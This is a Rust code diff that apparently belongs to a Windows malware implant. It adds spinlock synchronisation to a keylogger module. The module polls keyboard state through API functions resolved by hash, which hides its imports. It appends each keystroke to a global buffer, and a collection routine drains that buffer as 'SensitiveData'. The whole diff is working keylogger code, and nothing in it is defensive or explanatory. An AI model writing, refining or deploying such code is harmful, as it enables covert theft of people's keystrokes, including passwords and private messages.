@@ -1,4 +1,7 @@
 use crate::utils::sensitive::SensitiveData;
+use core::sync::atomic::{AtomicBool, Ordering};
+use zeroize::Zeroize;
+use alloc::string::String;
 
 #[cfg(target_os = "windows")]
 use crate::utils::api_resolver::{hash_str, resolve_function};
@@ -9,6 +12,20 @@ pub struct Collection;
 static mut KEY_BUFFER: alloc::vec::Vec<u8> = alloc::vec::Vec::new();
 #[cfg(target_os = "windows")]
 static mut KEYLOGGER_RUNNING: bool = false;
+#[cfg(target_os = "windows")]
+static BUFFER_LOCK: AtomicBool = AtomicBool::new(false);
+
+#[cfg(target_os = "windows")]
+fn lock() {
+    while BUFFER_LOCK.compare_exchange(false, true, Ordering::Acquire, Ordering::Relaxed).is_err() {
+        core::hint::spin_loop();
+    }
+}
+
+#[cfg(target_os = "windows")]
+fn unlock() {
+    BUFFER_LOCK.store(false, Ordering::Release);
+}
 
 impl Collection {
     pub fn keylogger_poll(&self) -> Option<SensitiveData> {
@@ -19,12 +36,17 @@ impl Collection {
                 KEYLOGGER_RUNNING = true;
             }
             
+            lock();
             let buffer = &mut *core::ptr::addr_of_mut!(KEY_BUFFER);
-            if buffer.is_empty() { return None; }
+            if buffer.is_empty() { 
+                unlock();
+                return None; 
+            }
             
             let sensitive = SensitiveData::new(buffer);
             buffer.zeroize();
             buffer.clear();
+            unlock();
             
             Some(sensitive)
         }
@@ -69,17 +91,14 @@ unsafe extern "system" fn keylogger_thread(_param: *mut core::ffi::c_void) -> u3
     let fn_sleep: FnSleep = core::mem::transmute(sleep);
     
     loop {
-        let buffer = &mut *core::ptr::addr_of_mut!(KEY_BUFFER);
         for i in 8..255 { 
             let state = fn_get_state(i);
             if (state & 1) != 0 {
-                // Key pressed
-                // Note: vk_to_str allocates String. In thread this might be unsafe if allocator not thread safe?
-                // MiniHeap likely has a lock or we hope no contention.
-                // Actually, MiniHeap in utils/heap.rs usually uses a spinlock.
-                // Assuming allocator is thread safe (GlobalAlloc).
                 let key_str = vk_to_str(i as u32);
+                lock();
+                let buffer = &mut *core::ptr::addr_of_mut!(KEY_BUFFER);
                 buffer.extend_from_slice(key_str.as_bytes());
+                unlock();
             }
         }
         fn_sleep(10);
